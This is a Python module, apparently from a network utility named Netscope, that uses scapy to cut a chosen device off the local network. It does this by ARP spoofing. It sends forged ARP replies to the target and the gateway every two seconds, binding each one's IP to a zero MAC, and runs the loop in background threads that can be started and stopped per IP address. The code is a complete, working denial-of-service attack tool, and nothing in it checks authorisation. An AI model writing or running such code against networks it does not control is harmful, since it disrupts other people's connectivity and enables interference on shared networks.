import threading
import time
from scapy.all import ARP, send, conf

# Keep track of active block threads
_active_blocks = {}

def get_default_gateway_ip():
    """Get the default gateway IP using scapy."""
    try:
        return conf.route.route("0.0.0.0")[2]
    except Exception:
        return None

def arp_poison_loop(target_ip, gateway_ip, stop_event):
    """
    Continuously send fake ARP packets to keep the target disconnected.
    We tell the target that the gateway is at a bogus MAC.
    We also tell the gateway that the target is at a bogus MAC.
    """
    # A standard completely bogus MAC
    bogus_mac = "00:00:00:00:00:00"
    
    # Packet to trick target: "I am the gateway, my MAC is bogus_mac"
    # op=2 is ARP Reply (is-at)
    pkt_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=bogus_mac)
    
    # Packet to trick gateway: "I am the target, my MAC is bogus_mac"
    pkt_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=bogus_mac)
    
    # scapy's send function is noisy, we silence it in the loop
    # or just use verbose=0
    while not stop_event.is_set():
        try:
            send(pkt_target, verbose=0)
            send(pkt_gateway, verbose=0)
        except Exception:
            pass
        time.sleep(2)  # poison every 2 seconds

def start_block(target_ip):
    """Start blocking a device by its IP."""
    if target_ip in _active_blocks:
        return True, "Already blocking this IP."
        
    gateway_ip = get_default_gateway_ip()
    if not gateway_ip:
        return False, "Could not determine default gateway, cannot block."
        
    # Test if we have permission to send raw packets (requires root)
    try:
        # A test empty packet to loopback
        send(ARP(op=2, pdst="127.0.0.1"), verbose=0, count=1)
    except PermissionError as e:
        return False, "Action failed! Blocking requires Administrator privileges. Please run the Application from the terminal using: sudo open /Users/jraghu/Downloads/Netscope/dist/Netscope.app"
    except Exception as e:
        if "Operation not permitted" in str(e) or "Permission" in str(e):
            return False, "Action failed! Network Blocking requires Root/Administrator privileges. Run this app via sudo."
        # Otherwise carry on or print error

    stop_event = threading.Event()
    t = threading.Thread(target=arp_poison_loop, args=(target_ip, gateway_ip, stop_event), daemon=True)
    t.start()
    
    _active_blocks[target_ip] = stop_event
    return True, f"Started blocking {target_ip}."

def stop_block(target_ip):
    """Stop blocking a device."""
    if target_ip in _active_blocks:
        _active_blocks[target_ip].set()
        del _active_blocks[target_ip]
        # Optionally, we could send an ARP restorer packet here to fix their ARP tables faster,
        # but simply stopping the poison allows the network to naturally self-heal on the next genuine ARP.
        return True, f"Stopped blocking {target_ip}."
    return False, "IP is not currently blocked."

def get_blocked_ips():
    """Return list of currently blocked IPs."""
    return list(_active_blocks.keys())
